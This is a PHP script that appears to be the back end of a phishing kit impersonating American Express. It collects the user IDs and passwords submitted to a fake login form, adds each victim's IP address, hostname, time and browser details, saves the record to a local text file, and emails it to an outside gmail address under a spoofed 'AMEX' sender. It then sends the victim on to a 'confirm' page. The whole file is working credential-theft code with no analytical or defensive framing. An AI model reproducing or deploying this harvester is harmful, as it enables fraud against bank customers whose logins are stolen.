<?php 
$to = "loganresult@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message = "==================  NEW LOG ".$ip." ==================\n";
$message.= "1st user id : ".$_POST['userid']."\n";
$message.= "1st pass : ".$_POST['password1']."\n";
$message.= "USER ID : ".$_POST['username']."\n";
$message.= "Password : ".$_POST['password']."\n";
$message.= "============= [ Ip & Hostname Info ] =============\n";
$message.= "Client IP : ".$ip."\n";
$message.= "HostName : ".$hostname."\n";
$message.= "Date And Time : ".$date."\n";
$message.= "Browser Details : ".$user_agent."\n";
$message.= "=============+Codewizard+===========\n";
$message.= "+-----/!\-----| NEW LOG |-----/!\-----+\n";
$to = "loganresult@gmail.com";
$subj = " AMEX NEW ||".$ip."\n";
$from = "From: AMEX  <codewizard@approject.com>";
$fp = fopen('XXXaxmexXXX00SREZUxxxsassssssilkklllllxSDSSSVSSS.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
$subject = "AMEX NEW $ip";
Header ("Location: confirm.php");
?>